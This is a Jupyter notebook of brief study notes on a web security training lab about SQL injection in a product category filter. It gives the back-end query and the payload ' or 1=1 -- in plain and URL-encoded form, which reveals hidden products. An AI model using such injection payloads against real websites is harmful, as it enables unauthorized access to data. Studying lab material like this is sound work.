{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data\n",
    "- sqli: product category filter\n",
    "- end goal: display all of unreleased products"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "- URL: `https://0a3f003c048390a880633f6f00050041.web-security-academy.net/`\n",
    "\n",
    "- front-end: `/filter?category=Pets`\n",
    "- back-end:\n",
    "```sql\n",
    "SELECT * FROM products WHERE category = 'Pets' AND released = 1\n",
    "```\n",
    "\n",
    "- front-end: `/filter?category='`\n",
    "- back-end:\n",
    "```sql\n",
    "SELECT * FROM products WHERE category = ''' AND released = 1\n",
    "'-- Internal Server Error \n",
    "```\n",
    "\n",
    "- front-end: `/filter?category=' or 1=1 --`\n",
    "- when you use `burpsuite` or `caido` you should encode the url like this: `/filter?category='%20or%201%3D1%20--`\n",
    "- back-end:\n",
    "```sql\n",
    "SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1\n",
    "-- this payload is use for comment which mean ignore everything that follow 1=1\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
